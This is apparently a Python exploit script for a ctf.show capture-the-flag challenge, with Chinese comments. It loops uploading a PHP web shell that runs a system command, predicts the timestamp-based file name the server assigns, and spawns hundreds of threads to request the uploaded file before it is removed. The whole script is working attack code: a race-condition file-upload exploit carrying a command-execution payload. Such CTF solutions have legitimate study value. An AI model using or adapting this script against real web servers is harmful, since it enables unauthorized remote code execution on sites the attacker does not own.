import requests
import time
import threading

url = "http://4c204f26-3862-4e3d-a458-769a6889ee4e.challenge.ctf.show/" # https会报错


def Thread(fun, *args): # 创建一个线程
    return threading.Thread(target=fun, args=args) # 多线程函数(target指定运行函数，args需要的参数)


def req(fname): # 尝试执行fname
    r = requests.get(url + "uploads/" + fname + ".php")
    x = r.text
    if len(x) > 0 and "404 Not Found" not in x and "容器已过期" not in x:
        print(x) # 如果有回显就输出


def Thread_start(fname):
    for i in range(100, 400):
        # 每个文件名单起一个线程
        Thread(req, fname + str(i)).start() # 打开所有100到400结尾的fname文件，分别创建进程分别打开


def upload():
    while True:
        file_data = {'file': ('shell.php', "<?php system(\"ls -l ../\");?>".encode())} # 不断上传
        r = requests.post(url + "upload.php", files=file_data) # 上传shell.php并获取回显
        txt = r.text
        print("uploaded:", txt) # 输出上传后得到的内容
        # 用本次的文件名推算下一次的文件名，相差sleep一次的时间间隔
        ts = int(time.mktime(time.strptime(txt[8:22], "%Y%m%d%H%M%S")))
        fname = time.strftime("%Y%m%d%H%M%S", time.localtime(ts + 1)) # 获取下一秒时间 另一道题改成3
        # 单起一个线程，爆破下一次upload的文件名
        Thread(Thread_start, fname).start() # 创建一个能打开所有文件的进程，同时进行下一次循环


if __name__ == '__main__':
    upload()
